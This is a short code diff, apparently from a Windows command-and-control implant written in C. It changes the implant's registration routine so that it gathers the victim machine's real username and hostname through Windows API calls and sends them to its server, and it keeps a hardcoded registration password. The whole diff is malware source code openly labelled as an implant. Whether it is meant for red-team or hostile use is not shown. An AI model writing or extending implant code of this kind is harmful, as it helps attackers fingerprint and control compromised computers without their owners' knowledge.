@@ -142,6 +142,7 @@ char *SetID() {
 	return (char *)ImplantID;
 }
 
+
 // Function to register Implant with the Server
 int RegisterSelf() {
 	RegisterImplant ri = RegisterImplant_init_zero;
@@ -149,8 +150,17 @@ int RegisterSelf() {
 	ri.GUID = SetID();
 	DEBUG_PRINTF("IMPLANT GUID = %s\n", ri.GUID);
 
-	ri.Hostname = "test" ;
-	ri.Username = "userwoozer";
+	DWORD dwSizeUser = MAX_PATH;
+	DWORD dwSizeHostname = MAX_PATH;
+	char username[MAX_PATH];
+	GetUserNameA(username, &dwSizeUser);
+	char hostname[MAX_PATH];
+	GetComputerNameA(hostname, &dwSizeHostname);
+	ri.Hostname = hostname;
+	ri.Username = username;
+	DEBUG_PRINTF("HOSTNAME = %s\n", ri.Hostname);
+	DEBUG_PRINTF("USERNAME = %s\n", ri.Username);
+
 	ri.Password = "SUPER_COMPLEX_PASSWORD_WOWZA!!!";
 
 	size_t bufferSize = 0;
